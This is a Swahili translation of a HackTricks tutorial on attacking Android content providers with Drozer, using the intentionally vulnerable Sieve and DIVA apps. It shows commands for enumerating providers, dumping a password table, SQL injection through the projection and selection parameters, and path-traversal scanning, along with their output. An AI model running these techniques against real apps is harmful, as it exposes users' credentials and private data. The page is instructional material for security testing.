# Kuchexploitisha Watoa Huduma wa Yaliyomo

## Kuchexploitisha Watoa Huduma wa Yaliyomo

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Utangulizi

Data inatolewa kutoka kwa maombi mengine kwa ombi kutoka kwa kipengele kinachoitwa **mtoa huduma wa yaliyomo**. Maombi haya yanadhibitiwa kupitia njia za darasa la **ContentResolver**. Watoa huduma wa yaliyomo wanaweza kuhifadhi data zao katika maeneo mbalimbali, kama vile **database**, **faili**, au kupitia **mtandao**.

Katika faili ya _Manifest.xml_, tangazo la mtoa huduma wa yaliyomo linahitajika. Kwa mfano:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
Kupata ufikiaji wa `content://com.mwr.example.sieve.DBContentProvider/Keys`, idhini ya `READ_KEYS` ni muhimu. Ni ya kuvutia kufahamu kuwa njia `/Keys/` inaweza kufikiwa katika sehemu ifuatayo, ambayo haiko salama kutokana na kosa lililofanywa na mwandishi wa programu, ambaye alilinda `/Keys` lakini alitangaza `/Keys/`.

**Labda unaweza kupata data binafsi au kutumia udhaifu fulani (SQL Injection au Path Traversal).**

## Pata habari kutoka kwa **watoa huduma za yaliyomo zilizofichuliwa**
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
Inawezekana kuunganisha jinsi ya kufikia **DBContentProvider** kwa kuanza URIs na "_content://_". Mbinu hii inategemea ufahamu uliopatikana kwa kutumia Drozer, ambapo habari muhimu ilipatikana katika saraka ya _/Keys_.

Drozer inaweza **kudhani na kujaribu URIs kadhaa**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
Unapaswa pia kuangalia **msimbo wa ContentProvider** kutafuta maswali:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

Pia, ikiwa huwezi kupata maswali kamili unaweza **kuangalia majina yaliyotangazwa na ContentProvider** kwenye mbinu ya `onCreate`:

![](<../../../.gitbook/assets/image (561).png>)

Swali litakuwa kama: `content://jina.la.package.class/jina_lililotangazwa`

## **Watoa Huduma wa Yaliyomo Yaliyobadilishwa na Database**

Labda watoa huduma wengi wa yaliyomo hutumiwa kama **interface** kwa **database**. Kwa hivyo, ikiwa unaweza kupata ufikiaji unaweza kuwa na uwezo wa **kutoa, kusasisha, kuingiza na kufuta** habari.\
Angalia ikiwa unaweza **kupata habari nyeti** au jaribu kubadilisha ili **kipuuze mifumo ya idhini**.

Unapochunguza msimbo wa Mtoaji wa Yaliyomo, **angalia** pia kwa **kazi** zilizo na majina kama: _swali, ingiza, sasisha na futa_:

![](<../../../.gitbook/assets/image (884).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Kwa sababu utaweza kuzipiga

### Swali la yaliyomo
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Weka yaliyomo

Kwa kuuliza database utajifunza **jina la safuwima**, kisha, unaweza kuweza kuweka data katika DB:

![](<../../../.gitbook/assets/image (95).png>)

![](<../../../.gitbook/assets/image (170).png>)

_Nota kwamba katika kuweka na kuboresha unaweza kutumia --string kuashiria string, --double kuashiria double, --float, --integer, --long, --short, --boolean_

### Boresha yaliyomo

Ukiwa unajua majina ya safuwima unaweza pia **kurekebisha viingilio**:

![](<../../../.gitbook/assets/image (777).png>)

### Futa yaliyomo

![](<../../../.gitbook/assets/image (420).png>)

### **SQL Injection**

Ni rahisi kujaribu kwa SQL injection **(SQLite)** kwa kubadilisha **projection** na **fields za uteuzi** ambazo zinapitishwa kwa mtoa yaliyomo.\
Unapouliza Mtoa Yaliyomo kuna hoja 2 za kuvutia za kutafuta habari: _--uteuzi_ na _--projection_:

![](<../../../.gitbook/assets/image (781).png>)

Unaweza kujaribu **kutumia vibaya** hizi **paramita** kujaribu kwa **SQL injections**:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Kugundua SQLInjection kiotomatiki na Drozer**
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Watoa Huduma wa Yaliyomo yanayoungwa na Mfumo wa Faili**

Watoa huduma wa yaliyomo wanaweza kutumika pia kufikia **faili:**

![](<../../../.gitbook/assets/image (404).png>)

### Soma **faili**

Unaweza kusoma faili kutoka kwa Mtoa Huduma wa Yaliyomo
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Ufuatiliaji wa Njia**

Ikiwa unaweza kupata faili, unaweza kujaribu kutumia Ufuatiliaji wa Njia (katika kesi hii haitakiwi lakini unaweza kujaribu kutumia "_../_" na mbinu kama hizo).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Kugundua Ufikiaji wa Njia kiotomatiki na Drozer**
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Marejeo

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
